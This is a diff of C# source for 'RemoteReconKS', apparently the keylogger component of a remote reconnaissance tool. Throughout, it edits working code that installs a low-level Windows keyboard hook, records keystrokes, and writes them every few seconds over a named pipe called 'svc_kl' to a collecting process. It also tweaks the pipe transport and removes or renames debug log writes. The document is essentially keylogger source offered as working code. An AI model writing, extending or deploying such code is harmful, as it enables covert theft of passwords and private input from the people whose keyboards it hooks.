@@ -71,22 +71,16 @@ namespace RemoteReconKS
             {
                 LogKeyStrokes();
             });
-            t.SetApartmentState(ApartmentState.MTA);
             t.IsBackground = true;
             t.Start();
-#if DEBUG
-            File.AppendAllText(@"C:\Users\dso\Desktop\kl.log", "Starting Application loop");
-#endif
             try
             {
                 Application.Run();
                 WinApi.UnhookWindowsHookEx(WinApi._hookID);
+                Application.ExitThread();
             }
             catch (Exception e)
             {
-#if DEBUG
-                File.AppendAllText(@"C:\Users\dso\Desktop\kl.log", e.ToString());
-#endif
                 
             }
             
@@ -95,41 +89,38 @@ namespace RemoteReconKS
         
         private static void LogKeyStrokes()
         {
-            NamedPipeClientStream client = new NamedPipeClientStream(".","svckl", PipeDirection.InOut);
+            NamedPipeClientStream client = new NamedPipeClientStream(".","svc_kl", PipeDirection.InOut);
             client.Connect(5000);
-#if DEBUG
-            File.AppendAllText(@"C:\Users\dso\Desktop\kl.log", "Connected to server" + '\n');
-#endif
-            sw = new StreamWriter(client);
+            //sw = new StreamWriter(client);
             while (client.IsConnected)
             {
                 try
                 {
+                    //sw.WriteLine(keylogoutput.ToString());
+                    byte[] klBytes = Encoding.ASCII.GetBytes(keylogoutput.ToString());
+                    client.Write(klBytes, 0, klBytes.Length);
 #if DEBUG
-                    File.AppendAllText(@"C:\Users\dso\Desktop\kl.log", keylogoutput.ToString());
+                    File.AppendAllText("C:\\Users\\dso\\Desktop\\keylog.log",keylogoutput.ToString());
 #endif
-                    sw.WriteLine(keylogoutput.ToString());
                     keylogoutput.Remove(0, keylogoutput.Length);
                 }
                 catch (Exception e)
                 {
 #if DEBUG
-                    File.AppendAllText(@"C:\Users\dso\Desktop\kl.log", e.ToString() + "\n");
+                    File.AppendAllText("C:\\Users\\dso\\Desktop\\keylog.log", e.ToString());
 #endif
                 }
                 
                 
-                Thread.Sleep(3000);
-                sw.Flush();
+                Thread.Sleep(5000);
+                //client.Flush();
             }
-#if DEBUG
-            File.AppendAllText(@"C:\Users\dso\Desktop\kl.log", "\nClient disconnected\n");
-#endif
             sw.Close();
             client.Close();
             client.Dispose();
         }
 
+        //Keyboard hook
         private static IntPtr SetHook(WinApi.LowLevelKeyboardProc proc)
         {
             using (Process curProcess = Process.GetCurrentProcess())
@@ -144,13 +135,13 @@ namespace RemoteReconKS
         public static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
         {
             byte[] keyboardState = new byte[256];
-            //StringBuilder keylogoutput = new StringBuilder();
+            
             IntPtr kblh = WinApi.GetKeyboardLayout(Process.GetCurrentProcess().Id);
 
             if (nCode >= 0 && (wParam == (IntPtr)WinApi.WM_KEYDOWN || wParam == (IntPtr)WinApi.WM_SYSKEYDOWN))
             {
                 int vkCode = Marshal.ReadInt32(lParam);
-
+                //Catch modifier keys and append a string representation.
                 switch ((Keys)vkCode)
                 {
                     case Keys.Space:
